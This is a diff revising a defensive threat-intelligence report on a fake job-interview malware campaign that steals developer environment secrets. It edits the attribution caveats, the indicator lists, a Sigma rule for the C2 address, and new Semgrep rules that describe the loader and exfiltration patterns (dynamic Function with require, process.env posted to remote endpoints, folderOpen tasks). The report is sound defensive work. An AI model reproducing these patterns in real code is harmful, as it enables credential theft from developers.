+- host fingerprinting using hostname, OS information, and MAC addresses;
+- HTTP C2 over TCP/3000 using a hardcoded `exceptionId` campaign marker.
 
-The Stage 2 payload code - including its obfuscation style, string rotation pattern, and beacon structure - is sufficiently similar to the TP-2026-001 `env-setup.js` variant to suggest either the same tooling author or a common toolkit shared across operators within the same group.
+The activity also differs from TP-2026-001 in important ways. TP-2026-001 used BSC smart-contract payload staging, while this report documents Vercel-based environment exfiltration and loader delivery. The C2 IP, GitHub accounts, lure company, and Stage 1 endpoint naming are different. These differences may indicate separate sub-campaigns, operator rotation, or reuse of a common toolkit by related operators. They do not prove a single operator.
 
-The operator identity findings are partially inconsistent with Lazarus Group's documented operational security posture. The registration of `commerce-media[.]org` under a registrar that retains identifiable metadata, the reuse of Gmail plus-addressing across multiple accounts (`0xsoftbuild+3`, `victoriaknowles903+2`), and the consistent `+0200` timezone offset across commits are indicators more consistent with a less disciplined actor than nation-state operators typically demonstrate. The domain registration on 2026-01-14 - predating the first repository commit by eleven days - does indicate deliberate pre-campaign infrastructure planning, but this level of preparation is not exclusive to state-sponsored actors. These factors do not exclude Lazarus Group attribution but reduce confidence in that specific assessment.
+Git author names, email addresses, plus-addressing, commit timezones, and lure-domain registration are useful for infrastructure clustering and pivoting. The new author extraction also shows historical/upstream-looking authors in the repositories, reinforcing the need to separate malicious HEAD/lure-cluster commits from inherited project history. None of these artifacts should be treated as personal attribution. They can be fabricated, borrowed, compromised, inherited from cloned codebases, or intentionally misleading.
 
-These similarities do not constitute confirmed attribution. The techniques described are well-documented and could be replicated by actors familiar with prior Contagious Interview reporting. Attribution should not be asserted without additional corroborating intelligence.
+Attribution remains tentative. The evidence supports alignment with Contagious Interview tradecraft; it does not independently prove Lazarus Group tasking or a specific DPRK operator.
 
 **Prior reporting:**
-- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
-- [CISA - TraderTraitor](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)
+- [MITRE ATT&CK - Contagious Interview / G1052](https://attack.mitre.org/groups/G1052/)
+- [Palo Alto Unit42 - Two Job-Related Campaigns Bear Hallmarks of North Korea-Sponsored Threat Actors](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
+- [Palo Alto Unit42 - DPRK Threat Actors Lure Tech Job Seekers as Fake Recruiters](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)
+- [Microsoft - Contagious Interview malware delivered through fake developer job interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
 - [ThreatProphet TP-2026-001 - Interview Trap](https://threatprophet.com/posts/2026-02-24-interview-trap/)
 
 ---
@@ -477,6 +536,8 @@ Treat this as a confirmed credential compromise regardless of how briefly the co
 - Alert on outbound HTTP plaintext connections originating from `node` processes on non-standard high ports
 - Monitor for outbound POST requests to `*.vercel.app` paths ending in `/api` from Node.js processes, particularly with header `x-app-request: ip-check`
 
+Defanged indicators are used throughout the public report. Refang values before deploying detection logic.
+
 **Sigma rule (conceptual):**
 
 ```yaml
@@ -486,12 +547,39 @@ logsource:
   category: network_connection
 detection:
   selection:
-    DestinationIp: '174.138.188.80'
+    DestinationIp: '174.138.188[.]80'
     DestinationPort: 3000
   condition: selection
 falsepositives:
   - None expected
 level: critical
+```
+
+**Source-code detection opportunities:**
+
+```yaml
+rules:
+  - id: node-dynamic-function-with-require
+    message: Dynamic JavaScript execution with injected require in Node.js project
+    severity: ERROR
+    languages: [javascript, typescript]
+    patterns:
+      - pattern: new Function('require', $PAYLOAD)(require)
+
+  - id: env-exfiltration-to-remote-endpoint
+    message: Runtime environment object sent to remote endpoint
+    severity: ERROR
+    languages: [javascript, typescript]
+    patterns:
+      - pattern-either:
+          - pattern: axios.post($URL, { ...process.env }, ...)
+          - pattern: fetch($URL, { ..., body: JSON.stringify({ ...process.env }), ... })
+
+  - id: vscode-folderopen-task
+    message: VS Code task executes automatically on folder open
+    severity: WARNING
+    languages: [json]
+    pattern: '"runOn": "folderOpen"'
 ```
 
 ### Host-Level Hardening
@@ -500,29 +588,9 @@ level: critical
 - Review `.vscode/tasks.json` before opening any unknown repository in VS Code; inspect specifically for `runOn: folderOpen` and any shell commands referencing remote URLs
 - Audit `prepare`, `postinstall`, and `preinstall` scripts in `package.json` before running `npm install` in unfamiliar projects
 - Run technical assessments from unknown sources inside an isolated VM or container with no access to host credentials, no mounted credential files, and filtered network egress
-- Use a dedicated assessment environment with clean `.env` and `.env.local` files containing no real credentials and no variables matching the actor's planted files - this defeats the selective gating mechanism, since the Stage 1 endpoint requires the presence of variables from both planted files to return the loader payload. Substitute or omit the `INFURA_PROJECT_ID`, `INFURA_PROJECT_SECRET`, and `SESSION_SECRET` values specifically
+- Use a dedicated assessment environment with no host secrets, no mounted credential files, and no real `.env` or `.env.local` values. When possible, inspect package scripts first and run dependency installation with script execution disabled, for example `npm install --ignore-scripts`, before deciding whether any project script should run.
 
 ---
-
-## Appendix: Evidence Artifacts
-
-| Artifact ID | Description | SHA256 |
-|---|---|---|
-| EX-003 | `.vscode/tasks.json` - VS Code auto-execution config | `48c6d172a43919df05ec9f506a1483e4c0fe820ea72092888d77b985aa7109c4` |
-| EX-004 | `frontend/.env` - Base64 endpoint and bait secrets | `603f46ba670a4be0bcf23429015ab00ccef04dc278bffc2d855eb8de52f9e711` |
-| EX-005 | `frontend/.env.local` - Additional bait secrets | `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` |
-| EX-006 | `frontend/server/controllers/auth.js` - Stage 1 exfiltration and loader | `865dd0484235a1bbe46241812e2bbdbe36101f1f8b3741aaecbfa819ae190167` |
-| EX-007 | `frontend/server/routes/api/auth.js` - Module-load trigger | `280f0138f8eff29392c93d52d639c049849143d8628914d6e82949fd714ee939` |
-| EX-008 | `frontend/package.json` - `start` and `prepare` trigger scripts | `9c7b96baaf461c9ca46db4472d5c65faec468b83db20ef1df25d6bde2bfa928d` |
-| EX-009 | Stage 2 beacon payload (obfuscated, captured) | `a25f293776496f991565b0b5e6103e3948fa99acf6f1d45482c794fd52023855` |
-| EX-010 | Stage 1 decoy response (benign) | `cc912c054e84000095b4e92fc8da36e4245eb6ad9d29dc1f102d05e566c90324` |
-| EX-011 | C2 response capture (2026-02-25) | `3c33f61d62e6b5632aa16326e672e85fa38ea04278c1db7b05f86c546cf18474` |
-| EX-012 | `Betfin/.env` - Distinct Stage 1 endpoint, shared bait secret template | `c49175c4e9d08fc6a242649815c716d0f445fb4229dbf22395fde99f25119a21` |
-| EX-013 | Japanese-Royal repository mirror archive | `c6bcb1d0ba766bc0da351fc137365b2762d9a5abda7a9d33a1363ed7056c7b7d` |
-| EX-014 | Betfin repository mirror archive (`0xroaman-1`) | `faa267bd900faa3d19cd1d6fb31c78fb21b6b154210c79855fe36e5532826a3b` |
-| EX-015 | `commerce-media[.]org` WHOIS record (2026-02-25) | `140703ff8bf1a8aca82feefc35934283623781179dcc1c8e4516a213f02fe79f` |
-| EX-016 | `0xroaman-2/Betfin` repository mirror archive | `27ad64f93b1a3d0caca7fe7972788653daeb56f4e6e2f54d749c51ef98b92d80` |
-| EX-017 | `0xroaman-2/Royal` repository mirror archive | `ff0bdd7180a0aec5fa8b64cc9d19e4da27ed2af1446e328dd9d93db06268442f` |
 
 ---
 
